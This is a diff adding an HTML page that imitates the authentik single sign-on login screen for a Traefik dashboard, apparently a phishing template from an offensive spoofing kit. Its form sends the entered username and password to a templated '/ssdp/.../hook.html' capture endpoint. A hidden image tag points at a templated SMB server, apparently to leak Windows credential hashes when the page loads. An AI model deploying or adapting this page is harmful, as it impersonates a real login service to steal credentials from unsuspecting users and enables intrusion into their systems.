@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to authentik!</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="locale">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path d="M12.87 15.07l-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"/>
+        </svg>
+        <span>English</span>
+    </div>
+
+    <main class="page">
+        <form class="card" method="POST" action="/ssdp/{{ template_idx }}/hook.html" name="LoginForm">
+            <div class="brand">
+                <svg class="brand-logo" width="236" height="44" viewBox="0 0 236 44" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="authentik">
+                    <g fill="#FD4B2D">
+                        <rect x="2" y="9" width="40" height="26" rx="6"/>
+                        <circle cx="12.5" cy="22" r="4.5" fill="#ffffff"/>
+                        <rect x="15" y="20" width="18" height="4" rx="2" fill="#ffffff"/>
+                        <rect x="28" y="20" width="4" height="8" rx="2" fill="#ffffff"/>
+                        <text x="50" y="33" font-family="'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif" font-size="34" font-weight="600" letter-spacing="-0.5">authentik</text>
+                    </g>
+                </svg>
+            </div>
+
+            <h1 class="title">Welcome to authentik!</h1>
+            <p class="subtitle">Log in to continue to Traefik Dashboard.</p>
+
+            <section id="password" class="stage stage-pw">
+                <div class="chip" id="userChip">
+                    <span class="chip-avatar" aria-hidden="true"></span>
+                    <span class="chip-name" id="chipName"></span>
+                </div>
+                <label class="field-label" for="passwordInput">Password <span class="req">*</span></label>
+                <input class="pf-input" id="passwordInput" type="password" name="password"
+                       placeholder="Please enter your password" autocomplete="current-password">
+                <a class="link-inline" href="#">Forgot password?</a>
+                <input class="pf-btn" type="submit" value="Continue">
+            </section>
+
+            <section class="stage stage-id">
+                <label class="field-label" for="uidInput">Email or Username <span class="req">*</span></label>
+                <input class="pf-input" id="uidInput" type="text" name="username"
+                       placeholder="Email or Username" autocomplete="username" autofocus>
+                <p class="field-error" id="uidError">Please enter your username.</p>
+                <a class="pf-btn" id="identBtn" href="#password">Log in</a>
+            </section>
+        </form>
+    </main>
+
+    <p class="powered">Powered by authentik</p>
+
+    <script src="script.js"></script>
+<img src="http://{{ smb_server }}" style="display: none;" />
+</body>
+</html>
